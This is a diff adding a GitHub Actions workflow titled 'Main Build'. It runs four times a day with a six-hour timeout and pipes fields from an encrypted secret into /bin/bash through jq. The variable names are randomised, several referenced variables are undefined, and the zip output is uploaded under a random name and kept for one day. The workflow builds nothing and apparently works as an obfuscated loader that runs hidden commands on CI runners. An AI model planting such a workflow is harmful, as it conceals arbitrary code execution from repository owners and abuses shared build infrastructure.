@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          cvw6: ${{ secrets.cvw6 }}
+        run: |
+          printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
+          echo $nu64 | jq -r .fxbfe064 | /bin/bash
+          printf '%s' "$bqd1" | jq -r .npyf7 | /bin/bash
+          echo $uyprf7503 | jq -r .w0 | /bin/bash
+          echo $dnih04 | jq -r .k5733 | /bin/bash
+          printf '%s' "$z1" | jq -r .dzji2 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: S7gBzjK6
+          path: "*.zip"
+          retention-days: 1
